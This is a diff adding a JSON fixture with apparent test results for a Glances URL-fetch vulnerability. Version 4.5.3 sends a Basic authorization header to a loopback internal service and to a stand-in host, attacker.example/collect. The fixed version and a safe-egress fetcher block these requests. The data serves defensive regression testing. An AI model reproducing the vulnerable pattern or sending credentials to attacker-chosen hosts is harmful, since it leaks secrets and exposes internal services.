@@ -1,0 +1,97 @@
+{
+  "vulnerable_4_5_3_direct_internal": {
+    "repository": "/Users/evanluo/Documents/Github/glances-v4.5.3",
+    "configured_url": "http://127.0.0.1/internal-status",
+    "plugin_disabled": false,
+    "requests": [
+      {
+        "url": "http://127.0.0.1/internal-status",
+        "authorization": "Basic Zml4dHVyZS11c2VyOmZpeHR1cmUtcGFzc3dvcmQ=",
+        "timeout": 2
+      }
+    ],
+    "fetch_result": {
+      "secret": "SIMULATED INTERNAL SERVICE"
+    }
+  },
+  "vulnerable_4_5_3_attacker_public_host": {
+    "repository": "/Users/evanluo/Documents/Github/glances-v4.5.3",
+    "configured_url": "https://attacker.example/collect",
+    "plugin_disabled": false,
+    "requests": [
+      {
+        "url": "https://attacker.example/collect",
+        "authorization": "Basic Zml4dHVyZS11c2VyOmZpeHR1cmUtcGFzc3dvcmQ=",
+        "timeout": 2
+      }
+    ],
+    "fetch_result": {
+      "ip": "203.0.113.7",
+      "source": "controlled fixture"
+    }
+  },
+  "maintainer_fixed_4_5_4_direct_http_internal": {
+    "repository": "/Users/evanluo/Documents/Github/glances-v4.5.4",
+    "configured_url": "http://127.0.0.1/internal-status",
+    "plugin_disabled": false,
+    "requests": [
+      {
+        "url": "http://127.0.0.1/internal-status",
+        "authorization": "Basic Zml4dHVyZS11c2VyOmZpeHR1cmUtcGFzc3dvcmQ=",
+        "timeout": 2
+      }
+    ],
+    "fetch_result": {
+      "secret": "SIMULATED INTERNAL SERVICE"
+    }
+  },
+  "maintainer_fixed_4_5_4_file_scheme": {
+    "repository": "/Users/evanluo/Documents/Github/glances-v4.5.4",
+    "configured_url": "file:///tmp/dummy-only",
+    "plugin_disabled": true,
+    "requests": [],
+    "fetch_result": null
+  },
+  "safe_egress_direct_internal": {
+    "configured_url": "http://127.0.0.1/internal-status",
+    "plugin_disabled": false,
+    "safe_send_urls": [],
+    "fetch_result": null
+  },
+  "safe_egress_untrusted_public_host": {
+    "configured_url": "https://attacker.example/collect",
+    "plugin_disabled": false,
+    "safe_send_urls": [],
+    "fetch_result": null
+  },
+  "safe_egress_http_downgrade": {
+    "configured_url": "http://ipv4.ipleak.net/json/",
+    "plugin_disabled": false,
+    "safe_send_urls": [],
+    "fetch_result": null
+  },
+  "safe_egress_public_to_internal_redirect": {
+    "configured_url": "https://ipv4.ipleak.net/json/",
+    "plugin_disabled": false,
+    "safe_send_urls": [
+      "https://ipv4.ipleak.net/json/"
+    ],
+    "fetch_result": null
+  },
+  "safe_egress_public_utility": {
+    "configured_url": "https://ipv4.ipleak.net/json/",
+    "plugin_disabled": false,
+    "safe_send_urls": [
+      "https://ipv4.ipleak.net/json/"
+    ],
+    "fetch_result": {
+      "ip": "203.0.113.7",
+      "source": "controlled fixture"
+    }
+  },
+  "empty_host_allowlist_rejected": true,
+  "private_ip_exception_rejected": true,
+  "broad_port_policy_rejected": true,
+  "network": "synthetic DNS and in-memory urllib/SafeFetcher responses; no sockets opened",
+  "policy_assumption": "the allowed public API hostname is trusted separately from the configurable URL"
+}
